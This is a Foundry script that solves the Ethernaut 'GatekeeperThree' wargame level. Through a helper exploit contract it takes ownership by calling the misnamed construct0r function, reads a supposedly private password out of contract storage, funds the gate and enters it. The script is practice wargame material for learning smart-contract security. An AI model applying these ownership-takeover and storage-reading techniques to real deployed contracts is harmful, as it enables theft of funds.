// SPDX-License-Identifier: MIT

pragma solidity 0.8.21;
import "forge-std/Script.sol";

import {Exploit, GatekeeperThree} from "../test/ethernaut/gatekeeper/Gatekeeper.sol";

contract ExploitGatekeeper is Script {
    function run() public {
        uint256 pk = vm.envUint("PK");

        vm.startBroadcast(pk);
        //0xeE51448c7182d9f74a6BE7bA73F86215C1b10F1d
        GatekeeperThree gate = GatekeeperThree(
            payable(0xeE51448c7182d9f74a6BE7bA73F86215C1b10F1d)
        );

        //0x1258d4D34aaF6c1E043816D8f381Cbde72BE4810
        Exploit exploit = Exploit(
            payable(0x1258d4D34aaF6c1E043816D8f381Cbde72BE4810)
        );
        console.log("Exploit", address(exploit));
        (bool success, ) = exploit.call(
            payable(gate),
            0,
            abi.encode(gate.construct0r.selector)
        );
        require(success);
        gate.createTrick();

        uint256 password = uint256(
            vm.load(address(gate.trick()), bytes32(uint256(2)))
        );
        gate.getAllowance(password);

        console.log("Allow?", gate.allowEntrance());
        (success, ) = address(gate).call{value: 0.00101 ether}("");

        require(success);
        (success, ) = exploit.call(
            payable(gate),
            0,
            abi.encode(gate.enter.selector)
        );
        require(success);
        console.log(">>>> Entrant: ", gate.entrant());

        vm.stopBroadcast();
    }
}
